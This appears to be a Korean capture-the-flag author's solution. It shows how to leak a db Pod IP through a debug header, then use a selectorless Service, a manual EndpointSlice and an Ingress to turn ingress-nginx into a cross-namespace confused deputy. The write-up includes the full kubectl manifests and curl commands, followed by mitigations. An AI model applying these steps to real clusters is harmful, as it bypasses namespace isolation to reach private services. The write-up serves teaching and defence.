# 풀이 (출제자용)

## 핵심 취약점

Ingress 컨트롤러는 ns `ingress-nginx` 에 있지만, 라우팅 대상은 **아무 네임스페이스의
어떤 Pod IP** 든 될 수 있다. 라우팅 대상은 Ingress → Service → Endpoint(Slice) 로
결정되는데, bastion 플레이어는 이 세 가지를 **자기 네임스페이스에서** 모두 만들 수 있다.

Service 를 selector 없이 만들고 EndpointSlice 에 db 의 Pod IP 를 직접 적으면,
kube-apiserver 의 "같은 ns Pod 만" 같은 검증도 없이 임의 IP 를 백엔드로 등록할 수 있다.
그 Service 로 `/flag` Ingress 를 걸면, 컨트롤러가 대신 db:8080/flag 를 긁어 온다.

네임스페이스 RBAC(교차 ns 조회 차단)도, "db 는 app 에서만" NetworkPolicy 도 이 경로를
막지 못한다. 전자는 컨트롤러가 플레이어 대신 연결하기 때문이고(대리자), 후자는 아래 주의 참고.

## 1단계 — db Pod IP 유출 (개발 잔재 헤더)

app 은 db 가 보낸 `X-Pod-IP` 디버그 헤더를 `X-Debug-Upstream` 으로 그대로 재노출한다.

```
curl -sk -i https://localhost:443/user | grep -i x-debug-upstream
# X-Debug-Upstream: 10.244.2.5:8080   (예시 — 환경마다 다름)
```

## 2단계 — bastion 쉘에서 대리자 경로 구성

```
nc localhost 1337
```

쉘에서 db Pod IP 를 변수에 넣고(위에서 읽은 값) 아래를 그대로 붙여넣는다.
`DBIP` 만 실제 값으로 바꾼다.

```
DBIP=10.244.1.2

kubectl apply -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: pwn
  namespace: bastion
spec:
  ports:
  - name: http
    port: 80
    targetPort: 8080
---
apiVersion: discovery.k8s.io/v1
kind: EndpointSlice
metadata:
  name: pwn-1
  namespace: bastion
  labels:
    kubernetes.io/service-name: pwn
addressType: IPv4
ports:
- name: http
  port: 8080
  protocol: TCP
endpoints:
- addresses:
  - "${DBIP}"
  conditions:
    ready: true
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: pwn
  namespace: bastion
spec:
  ingressClassName: nginx
  rules:
  - http:
      paths:
      - path: /flag
        pathType: Prefix
        backend:
          service:
            name: pwn
            port:
              number: 80
EOF
```

- `Service pwn` 는 selector 가 없다 → kube-proxy/컨트롤러는 EndpointSlice 를 직접 쓴다.
- `EndpointSlice` 의 `kubernetes.io/service-name: pwn` 라벨이 Service 와 묶는다.
- 포트 이름 `http` 가 Service 포트 이름과 일치해야 ingress-nginx 가 매핑한다.

## 3단계 — 플래그 회수

Ingress 반영까지 몇 초 기다린 뒤:

```
curl -sk https://localhost:443/flag
# {"flag": "flag{ingress_controller_is_a_confused_deputy_across_namespaces}"}
```

`/flag` 요청이 ns bastion 의 Ingress 에 매칭 → Service pwn → EndpointSlice(db Pod IP)
→ **컨트롤러가 db:8080/flag 로 직접 연결** → 플래그 반환.

## 왜 기존 통제가 안 막나

- **네임스페이스 RBAC**: 플레이어는 ns db 를 조회조차 못 한다. 하지만 공격은 ns db 를
  건드리지 않는다. 자기 ns 리소스만 만들고, 실제 연결은 컨트롤러가 대신한다.
- **NetworkPolicy**: 이 클러스터의 CNI(kindnet)는 NetworkPolicy 를 **집행한다**.
  db 정책(`db-allow-app-and-ingress`)은 ns `app` 과 ns `ingress-nginx` 에서 오는
  트래픽만 허용한다. 그래서 bastion 에서 db Pod IP 로 직접 붙는 경로는 애초에 막혀 있고
  (게다가 플레이어 쉘은 Pod 네트워크로 가는 경로 자체가 없다), 유일하게 뚫리는 길은
  **허용된 ns ingress-nginx 에 있는 컨트롤러를 대리자로 쓰는 것**이다.
  `ingress-nginx` 를 넓게 허용한 이 정책이 바로 구멍이다: Ingress 를 만들 수 있는
  누구든 그 신뢰된 컨트롤러를 "비공개" 백엔드로 향하게 할 수 있다. 정상 경로(app→db)와는
  무관하게 컨트롤러발 트래픽이 통과한다 — confused deputy 의 본질.
  (검증: 컨트롤러 Pod 에서 `wget db_pod_ip:8080/flag` 는 통하지만, 정책에서
  ns ingress-nginx 를 빼면 504 로 막힌다.)

## 근본 해결 방향

- Ingress/HTTPRoute 백엔드를 **같은 네임스페이스**로 강제하고, 교차 ns 는 Gateway API
  의 `ReferenceGrant` 로 대상 ns 가 **명시 동의**한 경우만 허용.
- selector 없는 Service + 수동 EndpointSlice 생성 권한을 일반 네임스페이스에서 회수
  (임의 IP 백엔드 등록 차단).
- 컨트롤러 egress 를 NetworkPolicy 로 좁혀, 등록된 백엔드 ns 외로는 못 나가게.

## 정리 (재시도 시)

```
kubectl delete ingress pwn -n bastion --ignore-not-found
kubectl delete endpointslice pwn-1 -n bastion --ignore-not-found
kubectl delete svc pwn -n bastion --ignore-not-found
```
